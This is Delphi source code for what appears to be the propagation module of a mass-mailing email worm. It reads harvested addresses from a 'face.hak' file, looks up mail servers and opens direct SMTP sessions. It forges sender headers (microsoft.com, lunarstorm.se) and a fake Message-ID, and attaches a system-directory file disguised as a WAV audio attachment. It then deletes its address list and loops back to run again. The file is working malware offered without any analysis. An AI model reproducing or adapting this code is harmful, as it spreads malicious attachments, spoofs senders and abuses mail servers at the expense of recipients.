   unit Unit2;

   interface
   Uses windows, winsock, Unit1, MXResolver;

   Procedure M(L3:String);
   procedure startgather;

   implementation


   TYPE
     Triple = ARRAY[1..3] OF BYTE;
     Quad   = ARRAY[1..4] OF BYTE;

   var
    Buf              : ARRAY[0..255] OF Char;
    pid:cardinal;
    FileBuf          : ARRAY[1..1000000] OF BYTE;                                 //You have to change it if your attachment bigger tgan 1MB
    CC               : STRING = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

    F                : Integer;
    A                : DWORD;
    Sock             : TSocket;
    Wsadatas         : TWSADATA;
    SockAddrIn       : TSockAddrIn;
    L,L1,L2          : String;
    C                : TextFile;

   FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
   VAR
     Q    : Quad;
     Strg : STRING;
   BEGIN
     IF Count<3 THEN BEGIN
       T[3]:=0;
       Q[4]:=64;
     END ELSE Q[4]:=(T[3] AND $3F);
     IF Count<2 THEN BEGIN
       T[2]:=0;
       Q[3]:=64;
     END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
     Q[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
     Q[1]:=((T[1] SHR 2) AND $3F);
     Strg:='';
     FOR Count:=1 TO 4 DO Strg:=(Strg+CC[(Q[Count]+1)]);
     RESULT:=Strg;
   END;

   FUNCTION BASE64(DataLength:DWORD) : AnsiString;
   VAR
     B      : AnsiString;
     I      : DWORD;
     Remain : DWORD;
     Trip   : Triple;
     Count  : WORD;
   BEGIN
     Count:=0;
     B:='';
     FOR I:=1 TO DataLength DIV 3 DO BEGIN
       INC(Count,4);
       Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
       Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
       Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
       B:=B+codeb64(3,Trip);
       IF Count=76 THEN BEGIN
         B:=B+#13#10;
         Count:=0;
       END;
     END;
     Remain:=DataLength-(DataLength DIV 3)*3;
     IF Remain>0 THEN BEGIN
       Trip[1]:=Ord(FileBuf[DataLength-1]);
       IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
       IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
     END;
     RESULT:=B;
   END;

   Procedure S(D:String);
   Begin
    Insert(#13#10,D,Length(D));
    Send(Sock, D, Length(D), 0);
   End;

   procedure startgather;
   var
    gg:integer;
   begin
    Thread := 5;
    FindHost;

    // now lets test the host with a email :P
    AssignFile(C, SysDir + 'face.hak');
    Reset(C);
    Read(C, l1);
    ReadLn(C, L2);
    L := L1;
    M(L);
    While not Eof(C) Do Begin
     Read(C, l1);
     ReadLn(C, L2);
     L := L1;
     M(L);
    End;
    CloseFile(C);
    DeleteFile(pChar(SysDir+'face.hak'));
    StartGather;
   end;

   Procedure M(L3:String);
   var
   MXResolver : TMXResolver;
   H          : Integer;
   Howst,ip,
   c,b,j      : String;
   A          : FILE;
   Label Blah;
   Begin
    Howst := Trim(Copy(L3, Pos('->',L3)+2, Length(L3)));
    Blah:
     MXResolver := TMXResolver.Create(Howst);
     If MXResolver.ListOfSMTPServers.Count = 0 then exit;
     If MXResolver.ListOfSMTPServers.Strings(0) = '' Then Goto Blah;
    For H := 0 To MXResolver.ListOfSMTPServers.Count -1 Do Begin
    IP := StrToIp(MXResolver.ListOfSMTPServers.Strings(H));
    WSAStartUp(257,WSADatas);
    Sock := Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
    SockAddrIn.sin_family := AF_INET;
    SockAddrIn.sin_port := htons(25);
    SockAddrIn.sin_addr.S_addr := Inet_Addr(pChar(ip));
    If Connect(Sock, SockAddrIn, SizeOf(SockAddrIn)) <> SOCKET_ERROR Then begin
      S('HELO ' + MXResolver.ListOfSMTPServers.Strings(H));
      S('MAIL FROM: '+Email_Sub+'@microsoft.com');
      S('RCPT TO: '+Copy(Mails,1,pos(#13#10,mails)-1));
      S('DATA');
   c := '';
   b := '';
   while length(c) <= 13 do
   c:=c+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   j := 'Message-ID: '+c+'.'+b+'.qmail@'+copy(MXResolver.ListOfSMTPServers.Strings(H),pos('.',MXResolver.ListOfSMTPServers.Strings(H))+1,length(MXResolver.ListOfSMTPServers.Strings(H)));
      S(j);
      S('From: admin@lunarstorm.se');
      S('Subject: '+Email_sub);
      S('To: '+Copy(Mails,1,pos(#13#10,mails)-1));
      S('MIME-Version: 1.0');
      S('Content-Type: multipart/mixed; boundary="bla"'+#13#10);
      S('--bla');
      S('Content-Type: text/plain; charset:us-ascii'+#13#10);
      S(Email_bod+#13#10);
      S('--bla');
      S('Content-Type: audio/x-wav;');
      S('    name="'+Email_att+'"');
      S('Content-Transfer-Encoding: base64'+#13#10);
      AssignFile(A,sysdir+Email_att);
      FileMode:=0;
      {$I-}
      Reset(A,1);
      IF IOResult=0 THEN BEGIN
       BlockRead(A,FileBuf[1],FileSize(sysdir+Email_att));
       S(BASE64(FileSize(sysdir+Email_att)));
       CloseFile(A);
      END;
      {$I+}
      S(#13#10+'--bla--'+#13#10);
      S(#13#10+'.'+#13#10+#13#10);
      S('QUIT');
     end;
    WSACleanup();
    End;
    Mails := Copy(Mails, pos(#13#10, Mails)+2, Length(Mails));
   End;


   end.
